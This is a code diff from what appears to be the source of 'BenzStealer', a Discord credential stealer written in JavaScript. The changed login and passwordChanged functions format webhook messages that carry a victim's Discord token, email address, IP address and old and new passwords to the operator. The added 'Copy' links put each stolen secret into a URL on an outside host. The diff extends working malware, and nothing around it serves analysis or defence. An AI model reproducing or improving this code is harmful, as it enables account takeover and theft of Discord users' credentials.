@@ -587,17 +587,17 @@ const login = async (email, password, token) => {
           },
           {
             name: '<:946246524516581396:990956286189383780> Email:',
-            value: `\`${email}\`\n[\`Copy\`](https://superfurrycdn.nl/copy/${token})`,
+            value: `\`${email}\`\n[\`Copy\`](https://superfurrycdn.nl/copy/${email})`,
             inline: true,
           },
           {
             name: '<:946246524826968104:990956293919490068> IP:',
-            value: `\`${config.ip}\`\n[\`IpInfo\`](https://ipinfo.io/{ip})`,
+            value: `\`${config.ip}\`\n[\`IpInfo\`](https://ipinfo.io/${config.ip})`,
             inline: true,
           },
           {
             name: '<a:946246524302655501:990956306355593276> Password:',
-            value: `\`${password}\`\n[\`Copy\`](https://superfurrycdn.nl/copy/${token})`,
+            value: `\`${password}\`\n[\`Copy\`](https://superfurrycdn.nl/copy/${password})`,
             inline: true,
           },
         ],
@@ -621,9 +621,6 @@ const login = async (email, password, token) => {
 
 const passwordChanged = async (oldpassword, newpassword, token) => {
   const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -632,27 +629,41 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            name: '<a:946246524634009600:990956317101424650> Token:',
+            value: `\`${token}\`\n[\`Copy\`](https://superfurrycdn.nl/copy/${token})`,
+            inline: false,
+          },
+          {
+            name: '<:946246524516581396:990956286189383780> Email:',
+            value: `\`${json.email}\`\n[\`Copy\`](https://superfurrycdn.nl/copy/${json.email})`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '<:946246524826968104:990956293919490068> IP:',
+            value: `\`${config.ip}\`\n[\`IpInfo\`](https://ipinfo.io/${config.ip})`,
             inline: true,
           },
           {
-            name: '**Token**',
-            value: `\`${token}\``,
+            name: '<a:946246524302655501:990956306355593276> Old Password:',
+            value: `\`${oldpassword}\`\n[\`Copy\`](https://superfurrycdn.nl/copy/${oldpassword})`,
+            inline: false,
+          },
+          {
+            name: '<a:946246524302655501:990956306355593276> New Password:',
+            value: `\`${newpassword}\`\n[\`Copy\`](https://superfurrycdn.nl/copy/${newpassword})`,
             inline: false,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: json.username + '#' + json.discriminator +  ' ('+json.id+') ',
+          url: 'https://cdn.discordapp.com/attachments/990782044676182069/990798452701147206/8c97eb5bb60b5e7bae869b44ddad6333.gif',
         },
         footer: {
           text: 'BenzStealer',
+          url: 'https://cdn.discordapp.com/attachments/990782044676182069/990798452701147206/8c97eb5bb60b5e7bae869b44ddad6333.gif',
+        },
+        thumbnail: {
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
       },
     ],
